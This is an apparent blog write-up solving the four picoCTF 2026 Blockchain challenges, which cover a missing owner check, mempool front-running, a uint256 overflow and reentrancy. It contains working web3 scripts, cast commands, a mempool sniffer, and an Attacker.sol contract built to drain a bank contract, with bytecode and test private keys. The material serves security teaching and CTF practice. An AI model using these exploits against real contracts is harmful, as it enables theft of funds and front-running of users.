---
title: "PicoCTF 2026: Blockchain"
date: 03-20-2026
excerpt: PicoCTF 2026 Writeup
cover: ../uploads/cover_picoblockchain.jpg
tags: Access Control, Mempool, Integer Overflow, Reentrancy
---

Good day, everyone! Today, I’ll be walking you through the challenges I’ve successfully solved in the Blockchain category of picoCTF 2026!

## Access Control - 200pts

For this challenge we are given a file called `AccessControl.sol` , `Eth node address` , `bc credentials`

```solidity
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;

    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");

        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

Look at `changeOwner` function:

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

There is **NO require(msg.sender == owner)**

That means: ANYONE can call `changeOwner()`
→ You can make yourself the owner
→ Then call `solve()`
→ Then call `getFlag()`

We can exploit this using Python web3!

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://lonely-island.picoctf.net:60068"))
acct = w3.eth.account.from_key("0x898976989cb9d3e6dd204639246031933294181a7e8ab3bd097d1ac8d9a0bcae")
contract = w3.eth.contract(
    address=Web3.to_checksum_address("0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"),
    abi=[
        {"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
    ]
)

nonce = w3.eth.get_transaction_count(acct.address)

# Helper to sign & send tx
def send_tx(tx):
    global nonce
    tx_dict = tx.build_transaction({
        "from": acct.address,
        "nonce": nonce,
        "gas": 200000,
        "gasPrice": w3.to_wei("1", "gwei")
    })
    signed = acct.sign_transaction(tx_dict)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    nonce += 1
    return tx_hash.hex()

print("changeOwner tx:", send_tx(contract.functions.changeOwner(acct.address)))
print("solve tx:", send_tx(contract.functions.solve()))
print("Flag:", contract.functions.getFlag().call())
```

And here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbFlQvwXCbGxUuT5tUDOc%252FScreenshot%2520%281738%29.png%3Falt%3Dmedia%26token%3D230fb289-a135-448e-85a2-0dea0d41e527&width=768&dpr=3&quality=100&sign=64f29bec&sv=2)

**Quick Explanation: What ABI is in simple words**

Think of a **smart contract** like a **vending machine**:

* The **buttons** on the vending machine are **functions** you can press.
* Each button may **take inputs** (like money or a code).
* Each button may **give outputs** (like a snack or a receipt).
* Some buttons **change the machine** (like refill stock), some just **read info** (like check your balance).

The **ABI** is like the **manual of the vending machine**. It tells you:

* What buttons (functions) exist
* What inputs each button needs
* What outputs you get
* Whether pressing it changes the machine (state) or just reads info

Without the ABI, your code wouldn’t know **how to interact with the contract**.

**This is our contract's buttons**

| Function      | Input                 | Output | Action Type            |
|--------------|----------------------|--------|------------------------|
| changeOwner  | `_newOwner (address)` | None   | Changes owner          |
| solve        | None                 | None   | Marks challenge solved |
| getFlag      | None                 | string | Reads the flag         |

## Front Running - 300pts

For this challenge we are given a file named `FrontRunning.sol`

```solidity
pragma solidity ^0.8.0;

contract MempoolChallenge {
    address public owner;
    address public studentAddress;
    string private flag;
    bool public revealed;

    bytes32 public constant targetHash = 0xd781033f8619ec5d3ab5387d3ad9b87203acce775bc100b32bfbac009e596cd6;

    event FlagRevealed(string flag);

    constructor(string memory _flag, address _studentAddress) {
        owner = msg.sender;
        flag = _flag;
        studentAddress = _studentAddress;
        revealed = false;
    }

    function solve(string memory solution) public {
        require(!revealed, "Challenge already solved!");
        require(keccak256(abi.encodePacked(solution)) == targetHash, "Incorrect solution!");

        require(msg.sender == studentAddress, "Only the student can claim the flag!");

        revealed = true;
        emit FlagRevealed(flag);
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

The vulnerability in this contract comes from the fact that the solution to the challenge is sent as a plain string inside a transaction, and Ethereum transactions are publicly visible in the mempool before they are mined. When the victim bot calls the `solve(string solution)` function, the correct solution is included in the transaction input data. Since the mempool is public, anyone monitoring pending transactions can read the calldata, extract the solution, and reuse it. This means the contract incorrectly assumes that the solution will remain secret until the transaction is confirmed, which is not true in public blockchain networks.

This leads to a front-running vulnerability. Because miners prioritize transactions with higher gas prices, an attacker who sees the victim’s pending transaction can send the same function call with the same solution but with a higher gas price, causing the attacker’s transaction to be mined first.

Let's try to watch the Mempool using `cast`! It's a command-line tool from the Foundry toolkit used for interacting with blockchain networks, especially Ethereum-based chains, directly from the terminal. It allows you to send transactions, call smart contract functions, check balances, convert data formats, and query blockchain information without writing code in Python or JavaScript.

```shell
cast rpc txpool_content --rpc-url "http://candy-mountain.picoctf.net:55354"
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fo3g1qBPItrWsDNmEh7oc%252FScreenshot%2520%281739%29.png%3Falt%3Dmedia%26token%3Df2e145f8-9d35-498a-a69c-18ef53b3e520&width=768&dpr=3&quality=100&sign=d59efa91&sv=2)

Ooppss, this means the RPC is **restricted**, picoCTF disabled `txpool_content` and `cast tx-pool`. Looks like we will sniff pending tx manually. We'll use Python web3 again for this!

```python
from web3 import Web3
import time

RPC = "http://candy-mountain.picoctf.net:55354"
w3 = Web3(Web3.HTTPProvider(RPC))

contract = Web3.to_checksum_address(
    "0x5FbDB2315678afecb367f032d93F642f64180aa3"
)
print("[+] Connected:", w3.is_connected())

pending_filter = w3.eth.filter("pending")

while True:
    tx_hashes = pending_filter.get_new_entries()
    for tx_hash in tx_hashes:
        try:
            tx = w3.eth.get_transaction(tx_hash)

            if tx and tx["to"] == contract:

                print("FOUND TX")
                print(tx)

                input_data = tx["input"]
                print("INPUT:", input_data)
        except:
            pass
    time.sleep(1)
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FL1FD7BCPU0sSYEF8wJCk%252FScreenshot%2520%281740%29.png%3Falt%3Dmedia%26token%3D37a5364c-f47d-424b-abbb-59940c1d3652&width=768&dpr=3&quality=100&sign=3f27ef50&sv=2)

Found it! As you can see, there's a `picoCTF` flag there, but that's not the actual flag so chill.

Look at the input:

```text
0x76fe1e92
...
00000017
7069636f4354467b6d336d7030306c5f7031723474337d
```

If we decode the ASCII part, we'll get this:

```
picoCTF{m3mp00l_p1r4t3}
```

This is the **preimage** for `solve()`, not the flag yet.

Next thing that we will do is to send front‑run transaction. We will use higher gas price than victim (victim used 1 gwei)

Victim gasPrice is `1000000000`, what we'll do is we will send with bigger gasPrice.

```shell
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "solve(string)" "picoCTF{m3mp00l_p1r4t3}" --private-key 0x0537df72b1f141bf75ecf3052f0902c41c4fa4493afa526a1f34de3e8f20b016 --rpc-url http://candy-mountain.picoctf.net:62589 --gas-price 5000000000 --gas-limit 200000 --legacy`
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FxMZsDRbBTFWwF6f7ZPkj%252FScreenshot%2520%281741%29.png%3Falt%3Dmedia%26token%3D8dd7f398-ff6e-4c9f-8ae8-f0b4648c1626&width=768&dpr=3&quality=100&sign=14529e27&sv=2)

As you can see, the status is `success`! The transaction executed correctly! The flag is located in the logs in hex form, all we need to do is to decode it.

```shell
echo "1f7069636f4354467b6d336d7030306c5f68333173745f31363630303763627d" | xxd -r -p
```

Here's the result:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGurx26HhzcRB9J1dWd6e%252FScreenshot%2520%281743%29.png%3Falt%3Dmedia%26token%3Da13618d3-06f5-4222-9f9a-614432f96c72&width=768&dpr=3&quality=100&sign=a11844f8&sv=2)

## Smart Overflow - 300pts

For this challenge, we are given a file called `IntOverflowBank.sol`

```solidity
pragma solidity ^0.6.12;

contract IntOverflowBank {
    mapping(address => uint256) public balances;
    address public owner;
    string private flag;
    bool public revealed;

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);
    event FlagRevealed(string flag);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
        revealed = false;
    }

    function setFlag(string memory _flag) external onlyOwner {
        flag = _flag;
    }

    function deposit(uint256 amount) external {
        uint256 oldBalance = balances[msg.sender];
        balances[msg.sender] = balances[msg.sender] + amount;

        emit Deposit(msg.sender, amount);
        if (!revealed && balances[msg.sender] < amount) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender] - amount;
        emit Withdraw(msg.sender, amount);
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }
}
```

This is a classic **uint256 overflow challenge** in Solidity 0.6.12 (no SafeMath).
The flag is revealed when this condition becomes true:

```solidity
if (!revealed && balances[msg.sender] < amount) {
    revealed = true;
}
```

Normally after deposit:

```text
newBalance = oldBalance + amount
```

So `newBalance < amount` should be impossible…
EXCEPT when **integer overflow happens**.

In Solidity <0.8, uint256 wraps around:

```text
MAX = 2^256 - 1
MAX + 1 = 0
```

So if we make:

```text
oldBalance + amount > 2^256-1
```

it overflows → small number → condition true.

That triggers:

```text
balances[msg.sender] < amount
```

Then it will reveal the flag. That simple.

Here's our plan

* Deposit a huge number close to max uint256
* Deposit again → overflow
* Call getFlag()

Max uint256:

```text
2^256 - 1 =
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

We will use this.

```python
from web3 import Web3

RPC = "http://mysterious-sea.picoctf.net:56533"
PRIVATE_KEY = "0x76de14d00e35a8d9178e28056cbc3b56692a78b8b73ff688fadd5272d46a72ea"
ADDR = "0x55A6C027e2de0ee8723bdCdb8683a7e61AC08a22"
CONTRACT = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

abi = [
    {
        "inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],
        "name":"deposit",
        "outputs":[],
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "inputs":[],
        "name":"getFlag",
        "outputs":[{"internalType":"string","name":"","type":"string"}],
        "stateMutability":"view",
        "type":"function"
    }
]

w3 = Web3(Web3.HTTPProvider(RPC))

acct = w3.eth.account.from_key(PRIVATE_KEY)

contract = w3.eth.contract(
    address=Web3.to_checksum_address(CONTRACT),
    abi=abi
)

nonce = w3.eth.get_transaction_count(acct.address)

MAX = 2**256 - 1

# deposit max
tx1 = contract.functions.deposit(MAX).build_transaction({
    "from": acct.address,
    "nonce": nonce,
    "gas": 200000,
    "gasPrice": w3.to_wei("1", "gwei")
})

signed1 = acct.sign_transaction(tx1)
w3.eth.send_raw_transaction(signed1.raw_transaction)

print("sent 1")

# deposit 1 -> overflow
nonce += 1

tx2 = contract.functions.deposit(1).build_transaction({
    "from": acct.address,
    "nonce": nonce,
    "gas": 200000,
    "gasPrice": w3.to_wei("1", "gwei")
})

signed2 = acct.sign_transaction(tx2)
w3.eth.send_raw_transaction(signed2.raw_transaction)

print("sent 2")

# read flag
flag = contract.functions.getFlag().call()
print("Flag:", flag)
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Ft2O353cdomZBfnUn7esk%252FScreenshot%2520%281744%29.png%3Falt%3Dmedia%26token%3Df09e0cf2-190b-4183-a845-ae4c8776549f&width=768&dpr=3&quality=100&sign=753fdb88&sv=2)

## Reentrance - 400pts

For this challenge, we are given a file named `VulnBank.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract VulnBank {
    mapping(address => uint) public balances;
    address public owner;
    address public target;
    string private flag;
    bool public revealed;

    event Deposit(address indexed who, uint amount);
    event Withdraw(address indexed who, uint amount);
    event FlagRevealed(string flag);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
        revealed = false;
    }

    function setFlag(string memory _flag) external onlyOwner {
        flag = _flag;
    }

    function setTarget(address _target) external onlyOwner {
        target = _target;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds available");

        (bool sent, ) = msg.sender.call{value: amount}("");
        balances[msg.sender] -= amount;

        require(sent, "Transfer failed");

        if (!revealed && address(this).balance == 0) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }

    receive() external payable {}
}
```

From the challenge title itself, it's clear that it's all about **Reentrancy Attack**. A **reentrancy attack** is a smart contract vulnerability where an attacker can repeatedly call a function **before the contract updates its internal state**, allowing them to withdraw or use funds multiple times in a single transaction.

It usually happens when a contract:

1. Sends Ether to an external address
2. The external address is a contract
3. That contract runs code when it receives Ether (`receive()` / `fallback()`)
4. The attacker calls the vulnerable function again before the balance is updated

Because the state update happens **after** the external call, the attacker can keep re-entering the function and drain the contract.

Example Vulnerability pattern:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);

    msg.sender.call{value: amount}(""); // external call first

    balances[msg.sender] -= amount;     // state updated too late
}
```

Correct pattern:

`check → update → interact`

Wrong pattern (vulnerable):

`check → interact → update`

In the code provided by the challenge, that vulnerability is here:

```solidity
(bool sent, ) = msg.sender.call{value: amount}("");
balances[msg.sender] -= amount;
```

They send ETH first, then update balance → so we can re‑enter `withdraw()` before balance decreases.

`receive()` / fallback → perfect for reentrancy.

First thing that we will do is we will create our own exploit written in Solitidity.

Let's create a project using `forge`:

```shell
forge init exploit
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD8waTojZBgXn2Qoa4Yx8%252FScreenshot%2520%281747%29.png%3Falt%3Dmedia%26token%3Ddd998aab-06c7-4a24-bf37-3c9ad1cc4599&width=768&dpr=3&quality=100&sign=d1cd7b50&sv=2)

This will make a directory called `exploit` , next is we will navigate to `exploit/src`, and we will now create our own contract.

`Attacker.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint) external;
}

contract Attacker {

    IVulnBank public bank;
    address public owner;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether);

        bank.deposit{value: 1 ether}();

        bank.withdraw(1 ether);
    }

    receive() external payable {

        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }

    }
}
```

The contract first defines an interface `IVulnBank` so it can call the `deposit()` and `withdraw(uint)` functions of the target contract. In the constructor, we store the address of the vulnerable bank and sets the deployer as the owner. The `attack()` function starts the exploit by requiring at least 1 ether, depositing that ether into the bank, and then immediately calling `withdraw(1 ether)`. When the bank sends ether back, the `receive()` function is triggered automatically, and inside it we can check if the bank still has at least 1 ether left; if so, it calls `withdraw(1 ether)` again before the previous withdrawal finishes. This creates a loop where we keep withdrawing funds multiple times using the same balance, allowing the contract to drain all ether from the vulnerable bank.

Next thing that we will do is to build it.

```shell
forge build
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsIMl9AVEVPFnRX9rqs0Z%252FScreenshot%2520%281749%29.png%3Falt%3Dmedia%26token%3D3940b7b0-0fcb-4da0-9162-8dda357ba677&width=768&dpr=3&quality=100&sign=48a95820&sv=2)

Next thing that we will do is to get the bytecode of `Attacker.sol`

```shell
forge inspect Attacker bytecode
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FL8pmGCfF8wNlI6b1gx9j%252FScreenshot%2520%281750%29.png%3Falt%3Dmedia%26token%3D6203ab0c-bdac-43b4-b946-dcd7b2a053de&width=768&dpr=3&quality=100&sign=d81420a6&sv=2)

Copy the bytecode and we will save it to variable `BYTECODE`

```shell
export BYTECODE=0x608060405234801561001057600080fd5b506040516104323803806104328339818101604052602081101561003357600080fd5b8101908
080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffff
ffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373fffffffffffffffffffffffffffffffff
fffffff1602179055505061035d806100d56000396000f3fe6080604052600436106100385760003560e01c806376cdb03b1461011e5780638da5cb5b1461015f5780
639e5faafc146101a057610119565b3661011957670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673fffffff
fffffffffffffffffffffffffffffffff1631106101175760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff
ffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b8152600401808281526020019150506000604051808303816000878
03b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b506101336101aa565b
604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016b57600080fd5b506101746101ce565b604
051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a86101f4565b005b60008054906101000a900473ffff
ffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76
4000034101561020957600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff
ffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027957600080fd5b505af11580156
1028d573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff
ffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156
1030d57600080fd5b505af1158015610321573d6000803e3d6000fd5b5050505056fea2646970667358221220ce5aca28b4397c2b1723cd5eaf58ac2db0d44d46ff5f
3446071220792d5349a564736f6c634300060c0033
```

Next is we will encode the `constructor`

```shell
cast abi-encode "constructor(address)" 0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FNbhisAUW6Niu8AAluWYk%252FScreenshot%2520%281752%29.png%3Falt%3Dmedia%26token%3Dda3f1d4a-50c3-47be-b481-0e4d3c6386f1&width=768&dpr=3&quality=100&sign=7130deff&sv=2)

Copy the output with the `0x`

```shell
export ARGS=0000000000000000000000006fd09d4d9795a3e07eddbd9a82c882b46a5a6def
```

Now we will combine the Bytecode and the constructor

```shell
export DATA=${BYTECODE}${ARGS}
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZM6e6SFhBHFwjMwkqigp%252FScreenshot%2520%281753%29.png%3Falt%3Dmedia%26token%3Dbbfda59b-5216-4547-a629-5be1a9532461&width=768&dpr=3&quality=100&sign=2dc9ddb7&sv=2)

For this attack, we needed the **bytecode**, the **encoded constructor**, and their combination because we were deploying the attacker contract manually using `cast send --create`, which requires raw deployment data instead of automatically handling arguments like `forge create` does. The EVM only understands bytecode, so the compiled contract must be provided, but since the attacker contract has a constructor that requires the bank address, the constructor argument must also be encoded using ABI format. When deploying a contract, Ethereum expects the transaction data to be a single payload containing **the bytecode followed by the encoded constructor arguments**, so they must be combined into one string. Without combining them, the contract would either fail to deploy or deploy without the correct parameters, which would make the reentrancy attack impossible because the attacker contract would not know the target bank address.

Now let's deploy it

```shell
cast send --rpc-url "http://crystal-peak.picoctf.net:51898" --private-key 0x68e7435dd2b76089761541644c4b975d813fce55364cf5156c5d5a7c92d01f46 --gas-limit 1000000 --create $DATA
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLxWn99AHtNDxMF3xcByb%252FScreenshot%2520%281756%29.png%3Falt%3Dmedia%26token%3Deb075eff-54d5-402f-931f-f32415ec0f26&width=768&dpr=3&quality=100&sign=13149c39&sv=2)

It's successful!! Now let's get the attacker address(contractAddress) and proceed with the attack

```shell
cast send 0xBbBCd86Cda81361744561F47A39a7eDB9C4a68d0 "attack()" --value 1ether --rpc-url "http://crystal-peak.picoctf.net:51898" --private-key 0x68e7435dd2b76089761541644c4b975d813fce55364cf5156c5d5a7c92d01f46 --gas-limit 500000
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FIWWNFkAKHOhqamV7h3iw%252FScreenshot%2520%281758%29.png%3Falt%3Dmedia%26token%3D981699e0-0b1c-47ba-9540-f05a164d3e3d&width=768&dpr=3&quality=100&sign=28e05b72&sv=2)

As you can see, it's successful!! We've successfully drained the bank! The flag is in the logs again in hex format, let's decode it

```shell
echo "247069636f4354467b5570446154655f537434617465355f3173745f38373737386361637d" | xxd -r -p
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWuYKFAhjHeA0Qb0OnaOs%252FScreenshot%2520%281759%29.png%3Falt%3Dmedia%26token%3D3a3ae170-73ae-43dc-8c5f-0ff25b0dd071&width=768&dpr=3&quality=100&sign=168cf906&sv=2)

That's a wrap! We've successfully completed every Blockchain challenge in picoCTF 2026! Honestly, I was genuinely surprised to see a Blockchain category included this year, these challenges are still extremely new in the CTF world. Blockchain CTFs have only started appearing in the last few years, mostly after Ethereum and smart contract security became prominent. Compared to classic categories like web, crypto, or pwn, this is essentially a newborn category, and very few players have hands-on experience exploiting it.

Working through these challenges felt like stepping into uncharted territory, where the rules are still being written and the possibilities are endless. The fact that this is new reminds us that there’s always more to learn as technology expands. Each challenge not only tested our current skills but also pushed us to explore areas of blockchain security that few have tackled before. Completing them isn’t just about points—it’s about embracing the evolution of technology and preparing ourselves for the next frontier of cybersecurity.

As we close this chapter, it’s thrilling to think about what’s next, new technologies, new vulnerabilities, and new challenges waiting to be solved. Blockchain may be a newborn category today, but its potential is enormous, and the journey to master it has only just begun!
